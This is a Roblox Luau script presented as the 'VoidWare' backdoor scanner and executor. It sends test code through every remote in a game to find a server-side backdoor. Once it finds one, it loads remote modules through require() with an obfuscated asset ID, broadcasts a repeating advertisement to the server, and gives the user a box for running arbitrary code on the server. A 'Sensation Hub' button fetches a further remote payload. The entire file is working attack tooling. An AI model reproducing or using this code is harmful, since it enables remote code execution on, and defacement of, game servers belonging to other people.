local CollectionService = game:GetService("CollectionService")
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

getgenv().ignore = setmetatable({}, {__newindex = function() end})

local G2L = {}

local function dragify(Frame)
    local dragToggle = nil
    local dragSpeed = .25
    local dragInput = nil
    local dragStart = nil
    local startPos = nil
    local function updateInput(input)
        local Delta = input.Position - dragStart
        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
        game:GetService("TweenService"):Create(Frame, TweenInfo.new(.25), {Position = Position}):Play()
    end
    Frame.InputBegan:Connect(function(input)
        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
            dragToggle = true
            dragStart = input.Position
            startPos = Frame.Position
            input.Changed:Connect(function()
                if (input.UserInputState == Enum.UserInputState.End) then
                    dragToggle = false
                end
            end)
        end
    end)
    Frame.InputChanged:Connect(function(input)
        if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            dragInput = input
        end
    end)
    game:GetService("UserInputService").InputChanged:Connect(function(input)
        if (input == dragInput and dragToggle) then
            updateInput(input)
        end
    end)
end

G2L["ScreenGui_1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
G2L["ScreenGui_1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
G2L["ScreenGui_1"].Name = "VoidWareScanner"
G2L["ScreenGui_1"].ResetOnSpawn = false

CollectionService:AddTag(G2L["ScreenGui_1"], "main");

G2L["Frame_2"] = Instance.new("Frame", G2L["ScreenGui_1"]);
G2L["Frame_2"]["BorderSizePixel"] = 0;
G2L["Frame_2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["Frame_2"]["Size"] = UDim2.new(0, 456, 0, 274);
G2L["Frame_2"]["Position"] = UDim2.new(0, 210, 0, 12);
G2L["Frame_2"]["BackgroundTransparency"] = 0.2;
G2L["Frame_2"].Name = "VoidWare"


G2L["Close_3"] = Instance.new("TextButton", G2L["Frame_2"]);
G2L["Close_3"]["TextWrapped"] = true;
G2L["Close_3"]["BorderSizePixel"] = 0;
G2L["Close_3"]["TextSize"] = 48;
G2L["Close_3"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
G2L["Close_3"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["Close_3"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal);
G2L["Close_3"]["BackgroundTransparency"] = 0.7;
G2L["Close_3"]["Size"] = UDim2.new(0, 30, 0, 30);
G2L["Close_3"]["Text"] = "×";
G2L["Close_3"]["Name"] = "Close";
G2L["Close_3"]["Position"] = UDim2.new(0, 422, 0, 4);


G2L["UICorner_4"] = Instance.new("UICorner", G2L["Close_3"]);



G2L["UICorner_5"] = Instance.new("UICorner", G2L["Frame_2"]);



G2L["TextLabel_6"] = Instance.new("TextLabel", G2L["Frame_2"]);
G2L["TextLabel_6"]["TextWrapped"] = true;
G2L["TextLabel_6"]["BorderSizePixel"] = 0;
G2L["TextLabel_6"]["TextSize"] = 12;
G2L["TextLabel_6"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["TextLabel_6"]["TextScaled"] = true;
G2L["TextLabel_6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["TextLabel_6"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal);
G2L["TextLabel_6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["TextLabel_6"]["BackgroundTransparency"] = 1;
G2L["TextLabel_6"]["Size"] = UDim2.new(0, 444, 0, 144);
G2L["TextLabel_6"]["Text"] = "About VoidWare:\nVoidWare is a free to use backdoor scanner with fast backdoor scanning.\nDon't like something about VoidWare?\nContact St4rFl0w on discord to request some changes! :";
G2L["TextLabel_6"]["Position"] = UDim2.new(0, 6, 0, 124);


G2L["UIGradient_7"] = Instance.new("UIGradient", G2L["TextLabel_6"]);
G2L["UIGradient_7"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(168, 168, 168))};


G2L["Title_8"] = Instance.new("TextLabel", G2L["Frame_2"]);
G2L["Title_8"]["TextWrapped"] = true;
G2L["Title_8"]["BorderSizePixel"] = 0;
G2L["Title_8"]["TextSize"] = 28;
G2L["Title_8"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["Title_8"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["Title_8"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal);
G2L["Title_8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["Title_8"]["BackgroundTransparency"] = 0.7;
G2L["Title_8"]["Size"] = UDim2.new(0, 414, 0, 30);
G2L["Title_8"]["Text"] = "VoidWare backdoor scanner";
G2L["Title_8"]["Name"] = "Title";
G2L["Title_8"]["Position"] = UDim2.new(0, 4, 0, 4);


G2L["UICorner_9"] = Instance.new("UICorner", G2L["Title_8"]);



G2L["UIGradient_a"] = Instance.new("UIGradient", G2L["Title_8"]);
G2L["UIGradient_a"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(168, 168, 168))};


G2L["Scan_b"] = Instance.new("TextButton", G2L["Frame_2"]);
G2L["Scan_b"]["TextWrapped"] = true;
G2L["Scan_b"]["BorderSizePixel"] = 0;
G2L["Scan_b"]["TextSize"] = 36;
G2L["Scan_b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["Scan_b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["Scan_b"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["Scan_b"]["BackgroundTransparency"] = 0.7;
G2L["Scan_b"]["Size"] = UDim2.new(0, 448, 0, 56);
G2L["Scan_b"]["Text"] = "Scan for backdoors";
G2L["Scan_b"]["Name"] = "Scan";
G2L["Scan_b"]["Position"] = UDim2.new(0, 4, 0, 38);


G2L["UICorner_c"] = Instance.new("UICorner", G2L["Scan_b"]);



G2L["UIGradient_d"] = Instance.new("UIGradient", G2L["Scan_b"]);
G2L["UIGradient_d"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(168, 168, 168))};


G2L["UIGradient_e"] = Instance.new("UIGradient", G2L["Frame_2"]);
G2L["UIGradient_e"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(35, 0, 80))};


G2L["Status_f"] = Instance.new("TextLabel", G2L["Frame_2"]);
G2L["Status_f"]["TextWrapped"] = true;
G2L["Status_f"]["BorderSizePixel"] = 0;
G2L["Status_f"]["TextScaled"] = true;
G2L["Status_f"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["Status_f"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal);
G2L["Status_f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["Status_f"]["BackgroundTransparency"] = 0.7;
G2L["Status_f"]["Size"] = UDim2.new(0, 448, 0, 22);
G2L["Status_f"]["Text"] = "Status:";
G2L["Status_f"]["Name"] = "Status";
G2L["Status_f"]["Position"] = UDim2.new(0, 4, 0, 98);


G2L["UICorner_10"] = Instance.new("UICorner", G2L["Status_f"]);



G2L["UIGradient_11"] = Instance.new("UIGradient", G2L["Status_f"]);
G2L["UIGradient_11"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(168, 168, 168))};


G2L["UIStroke_12"] = Instance.new("UIStroke", G2L["Frame_2"]);

G2L["ScreenGui_13"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
G2L["ScreenGui_13"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
G2L["ScreenGui_13"].Name = "VoidWareExecutor"
G2L["ScreenGui_13"].ResetOnSpawn = false
G2L["ScreenGui_13"].Enabled = false

CollectionService:AddTag(G2L["ScreenGui_13"], "main");

G2L["Frame_14"] = Instance.new("Frame", G2L["ScreenGui_13"]);
G2L["Frame_14"]["BorderSizePixel"] = 0;
G2L["Frame_14"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["Frame_14"]["Size"] = UDim2.new(0, 456, 0, 274);
G2L["Frame_14"]["Position"] = UDim2.new(0, 210, 0, 12);
G2L["Frame_14"]["BackgroundTransparency"] = 0.2;
G2L["Frame_14"].Name = "VoidWareExecutor"


G2L["Close_15"] = Instance.new("TextButton", G2L["Frame_14"]);
G2L["Close_15"]["TextWrapped"] = true;
G2L["Close_15"]["BorderSizePixel"] = 0;
G2L["Close_15"]["TextSize"] = 48;
G2L["Close_15"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
G2L["Close_15"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["Close_15"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal);
G2L["Close_15"]["BackgroundTransparency"] = 0.7;
G2L["Close_15"]["Size"] = UDim2.new(0, 30, 0, 30);
G2L["Close_15"]["Text"] = "×";
G2L["Close_15"]["Name"] = "Close";
G2L["Close_15"]["Position"] = UDim2.new(0, 422, 0, 4);


G2L["UICorner_16"] = Instance.new("UICorner", G2L["Close_15"]);



G2L["Sens_17"] = Instance.new("TextButton", G2L["Frame_14"]);
G2L["Sens_17"]["TextWrapped"] = true;
G2L["Sens_17"]["BorderSizePixel"] = 0;
G2L["Sens_17"]["TextScaled"] = true;
G2L["Sens_17"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
G2L["Sens_17"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["Sens_17"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal);
G2L["Sens_17"]["BackgroundTransparency"] = 0.7;
G2L["Sens_17"]["Size"] = UDim2.new(0, 140, 0, 30);
G2L["Sens_17"]["Text"] = "Sensation Hub";
G2L["Sens_17"]["Name"] = "Sens";
G2L["Sens_17"]["Position"] = UDim2.new(0, 214, 0, 240);


G2L["UICorner_18"] = Instance.new("UICorner", G2L["Sens_17"]);



G2L["UIGradient_19"] = Instance.new("UIGradient", G2L["Sens_17"]);
G2L["UIGradient_19"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(195, 0, 0))};


G2L["UIStroke_20"] = Instance.new("UIStroke", G2L["Frame_14"]);



G2L["UICorner_21"] = Instance.new("UICorner", G2L["Frame_14"]);



G2L["Text_22"] = Instance.new("TextLabel", G2L["Frame_14"]);
G2L["Text_22"]["TextWrapped"] = true;
G2L["Text_22"]["BorderSizePixel"] = 0;
G2L["Text_22"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["Text_22"]["TextScaled"] = true;
G2L["Text_22"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["Text_22"]["FontFace"] = Font.new("rbxasset://fonts/families/ComicNeueAngular.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["Text_22"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["Text_22"]["BackgroundTransparency"] = 0.7;
G2L["Text_22"]["Size"] = UDim2.new(0, 92, 0, 28);
G2L["Text_22"]["Text"] = "Have fun! :]";
G2L["Text_22"]["Name"] = "Text";
G2L["Text_22"]["Position"] = UDim2.new(0, 358, 0, 240);


G2L["UICorner_23"] = Instance.new("UICorner", G2L["Text_22"]);



G2L["UIGradient_24"] = Instance.new("UIGradient", G2L["Text_22"]);
G2L["UIGradient_24"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(229, 229, 229)),ColorSequenceKeypoint.new(0.845, Color3.fromRGB(143, 143, 143)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(143, 143, 143))};


G2L["Clr_25"] = Instance.new("TextButton", G2L["Frame_14"]);
G2L["Clr_25"]["TextWrapped"] = true;
G2L["Clr_25"]["BorderSizePixel"] = 0;
G2L["Clr_25"]["TextScaled"] = true;
G2L["Clr_25"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["Clr_25"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["Clr_25"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal);
G2L["Clr_25"]["BackgroundTransparency"] = 0.7;
G2L["Clr_25"]["Size"] = UDim2.new(0, 90, 0, 30);
G2L["Clr_25"]["Text"] = "Clear";
G2L["Clr_25"]["Name"] = "Clr";
G2L["Clr_25"]["Position"] = UDim2.new(0, 120, 0, 240);


G2L["UICorner_26"] = Instance.new("UICorner", G2L["Clr_25"]);



G2L["UIGradient_27"] = Instance.new("UIGradient", G2L["Clr_25"]);
G2L["UIGradient_27"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(168, 168, 168))};


G2L["Exe_28"] = Instance.new("TextButton", G2L["Frame_14"]);
G2L["Exe_28"]["TextWrapped"] = true;
G2L["Exe_28"]["BorderSizePixel"] = 0;
G2L["Exe_28"]["TextScaled"] = true;
G2L["Exe_28"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["Exe_28"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["Exe_28"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal);
G2L["Exe_28"]["BackgroundTransparency"] = 0.7;
G2L["Exe_28"]["Size"] = UDim2.new(0, 110, 0, 30);
G2L["Exe_28"]["Text"] = "Execute";
G2L["Exe_28"]["Name"] = "Exe";
G2L["Exe_28"]["Position"] = UDim2.new(0, 6, 0, 240);


G2L["UICorner_29"] = Instance.new("UICorner", G2L["Exe_28"]);



G2L["UIGradient_30"] = Instance.new("UIGradient", G2L["Exe_28"]);
G2L["UIGradient_30"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(168, 168, 168))};


G2L["UIGradient_31"] = Instance.new("UIGradient", G2L["Frame_14"]);
G2L["UIGradient_31"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(35, 0, 80))};


G2L["TextBox_32"] = Instance.new("TextBox", G2L["Frame_14"]);
G2L["TextBox_32"]["CursorPosition"] = -1;
G2L["TextBox_32"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["TextBox_32"]["PlaceholderColor3"] = Color3.fromRGB(179, 179, 179);
G2L["TextBox_32"]["BorderSizePixel"] = 0;
G2L["TextBox_32"]["TextSize"] = 18;
G2L["TextBox_32"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["TextBox_32"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["TextBox_32"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["TextBox_32"]["FontFace"] = Font.new("rbxasset://fonts/families/Inconsolata.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["TextBox_32"]["PlaceholderText"] = "Require script here...";
G2L["TextBox_32"]["Size"] = UDim2.new(0, 444, 0, 200);
G2L["TextBox_32"]["Position"] = UDim2.new(0, 6, 0, 36);
G2L["TextBox_32"]["Text"] = "";
G2L["TextBox_32"]["BackgroundTransparency"] = 0.6;


G2L["Title_33"] = Instance.new("TextLabel", G2L["Frame_14"]);
G2L["Title_33"]["TextWrapped"] = true;
G2L["Title_33"]["BorderSizePixel"] = 0;
G2L["Title_33"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["Title_33"]["TextScaled"] = true;
G2L["Title_33"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["Title_33"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal);
G2L["Title_33"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["Title_33"]["BackgroundTransparency"] = 0.7;
G2L["Title_33"]["Size"] = UDim2.new(0, 414, 0, 30);
G2L["Title_33"]["Text"] = "VoidWare backdoor scanner";
G2L["Title_33"]["Name"] = "Title";
G2L["Title_33"]["Position"] = UDim2.new(0, 4, 0, 4);


G2L["UICorner_34"] = Instance.new("UICorner", G2L["Title_33"]);



G2L["UIGradient_35"] = Instance.new("UIGradient", G2L["Title_33"]);
G2L["UIGradient_35"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(168, 168, 168))};

dragify(G2L["Frame_2"])
dragify(G2L["Frame_14"])

local backdoor = nil
local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}

local function createTween(object, properties, duration)
    local tweenInfo = TweenInfo.new(duration or 0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local tween = TweenService:Create(object, tweenInfo, properties)
    tween:Play()
    return tween
end

local function generateName(length)
    local text = ''
    for i = 1, length do
        text = text .. alphabet[math.random(1,#alphabet)]
    end
    return text
end

local function runRemote(remote, data)
    if remote:IsA('RemoteEvent') then
        remote:FireServer(data)
    elseif remote:IsA('RemoteFunction') then
        spawn(function() remote:InvokeServer(data) end)
    end
end

local function updateStatus(message, color)
    G2L["Status_f"].Text = "Status: " .. message
    G2L["Status_f"].TextColor3 = color or Color3.fromRGB(255, 255, 255)
end

local function findRemote()
    local remotes = {}
    updateStatus("Starting scan...", Color3.fromRGB(255, 255, 0))
    
    local protected_backdoor = game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
    if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
        local code = generateName(math.random(12,30))
        spawn(function() 
            protected_backdoor:InvokeServer('lalol hub join today!! discord.gg/XXqzxT7E5z', "a=Instance.new('Model',workspace)a.Name='"..code.."'") 
        end)
        remotes[code] = protected_backdoor
    end
    
    for i,remote in game:GetDescendants() do
        if not remote:IsA('RemoteEvent') and not remote:IsA('RemoteFunction') then 
            continue 
        end

        if string.split(remote:GetFullName(), '.')[1]=='RobloxReplicatedStorage' then
            continue
        end

        if remote.Parent==game:GetService("ReplicatedStorage") or remote.Parent.Parent==game:GetService("ReplicatedStorage") or remote.Parent.Parent.Parent==game:GetService("ReplicatedStorage") then
            if remote:FindFirstChild('__FUNCTION') or remote.Name=='__FUNCTION' then
                continue
            end

            if remote.Parent.Parent.Name=='HDAdminClient' and remote.Parent.Name=='Signals' then
                continue
            end

            if remote.Parent.Name=='DefaultChatSystemChatEvents' then
                continue
            end
        end

        local code = generateName(math.random(12,30))
        runRemote(remote, "a=Instance.new('Model',workspace)a.Name='"..code.."'")
        remotes[code] = remote
    end
    
    for i = 1, 100 do
        updateStatus("Scanning... "..i.."%", Color3.fromRGB(255, 255, 0))
        for code,remote in remotes do
            if workspace:FindFirstChild(code) then
                backdoor = remote
                G2L["ScreenGui_1"].Enabled = false
                G2L["ScreenGui_13"].Enabled = true

                runRemote(remote, "require(171016405.1884*69)")            
                runRemote(remote, "a=Instance.new('Hint')a.Text='VoidWare | Free Backdoor Scanner | Made by StarFlow'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
                
                updateStatus("Backdoor found!", Color3.fromRGB(0, 255, 0))
                return true
            end
        end
        task.wait(0.05)
    end

    updateStatus("No backdoor found", Color3.fromRGB(255, 0, 0))
    return false
end

local function buttonClickEffect(button)
    createTween(button, {BackgroundColor3 = Color3.fromRGB(50, 50, 50)}, 0.1)
    task.wait(0.1)
    createTween(button, {BackgroundColor3 = Color3.fromRGB(0, 0, 0)}, 0.1)
end

G2L["Scan_b"].MouseButton1Click:Connect(function()
    G2L["Scan_b"].Text = "Scanning..."
    G2L["Scan_b"].TextColor3 = Color3.fromRGB(255, 255, 0)
    buttonClickEffect(G2L["Scan_b"])
    
    spawn(function()
        if not findRemote() then
            G2L["Scan_b"].Text = "Scan for backdoors"
            G2L["Scan_b"].TextColor3 = Color3.fromRGB(255, 255, 255)
        end
    end)
end)

G2L["Exe_28"].MouseButton1Click:Connect(function()
    local scriptText = G2L["TextBox_32"].Text
    if backdoor and scriptText ~= "" then
        runRemote(backdoor, scriptText)
        G2L["Exe_28"].Text = "Executed!"
        buttonClickEffect(G2L["Exe_28"])
        task.wait(0.5)
        G2L["Exe_28"].Text = "Execute"
    else
        G2L["Exe_28"].Text = "No script!"
        buttonClickEffect(G2L["Exe_28"])
        task.wait(0.5)
        G2L["Exe_28"].Text = "Execute"
    end
end)

G2L["Clr_25"].MouseButton1Click:Connect(function()
    G2L["TextBox_32"].Text = ""
    G2L["Clr_25"].Text = "Cleared!"
    buttonClickEffect(G2L["Clr_25"])
    task.wait(0.5)
    G2L["Clr_25"].Text = "Clear"
end)

G2L["Sens_17"].MouseButton1Click:Connect(function()
    if backdoor then
        local playerName = Players.LocalPlayer.Name
        runRemote(backdoor, "require(100263845596551)('"..playerName.."', ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(128, 0, 128)), ColorSequenceKeypoint.new(0.25, Color3.fromRGB(102, 0, 153)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(153, 51, 255)), ColorSequenceKeypoint.new(0.75, Color3.fromRGB(75, 0, 130)), ColorSequenceKeypoint.new(1, Color3.fromRGB(128, 0, 128))}), \"Standard\")")
        G2L["Sens_17"].Text = "Loaded!"
        buttonClickEffect(G2L["Sens_17"])
        task.wait(0.5)
        G2L["Sens_17"].Text = "Sensation Hub"
    end
end)

G2L["Close_3"].MouseButton1Click:Connect(function()
    createTween(G2L["Frame_2"], {Size = UDim2.new(0,0,0,0), Position = UDim2.new(0.5,0,0.5,0)}, 0.3)
    task.wait(0.3)
    G2L["ScreenGui_1"]:Destroy()
end)

G2L["Close_15"].MouseButton1Click:Connect(function()
    createTween(G2L["Frame_14"], {Size = UDim2.new(0,0,0,0), Position = UDim2.new(0.5,0,0.5,0)}, 0.3)
    task.wait(0.3)
    G2L["ScreenGui_13"]:Destroy()
end)

local function setupHoverEffects(button)
    button.MouseEnter:Connect(function()
        createTween(button, {BackgroundColor3 = Color3.fromRGB(30, 30, 30)}, 0.2)
    end)
    button.MouseLeave:Connect(function()
        createTween(button, {BackgroundColor3 = Color3.fromRGB(0, 0, 0)}, 0.2)
    end)
end

setupHoverEffects(G2L["Scan_b"])
setupHoverEffects(G2L["Exe_28"])
setupHoverEffects(G2L["Clr_25"])
setupHoverEffects(G2L["Sens_17"])

G2L["Close_3"].MouseEnter:Connect(function()
    createTween(G2L["Close_3"], {BackgroundColor3 = Color3.fromRGB(255, 50, 50)}, 0.2)
end)
G2L["Close_3"].MouseLeave:Connect(function()
    createTween(G2L["Close_3"], {BackgroundColor3 = Color3.fromRGB(0, 0, 0)}, 0.2)
end)

G2L["Close_15"].MouseEnter:Connect(function()
    createTween(G2L["Close_15"], {BackgroundColor3 = Color3.fromRGB(255, 50, 50)}, 0.2)
end)
G2L["Close_15"].MouseLeave:Connect(function()
    createTween(G2L["Close_15"], {BackgroundColor3 = Color3.fromRGB(0, 0, 0)}, 0.2)
end)

G2L["TextBox_32"].Focused:Connect(function()
    createTween(G2L["TextBox_32"], {BackgroundTransparency = 0.4}, 0.2)
end)

G2L["TextBox_32"].FocusLost:Connect(function()
    createTween(G2L["TextBox_32"], {BackgroundTransparency = 0.6}, 0.2)
end)

return G2L["ScreenGui_1"], require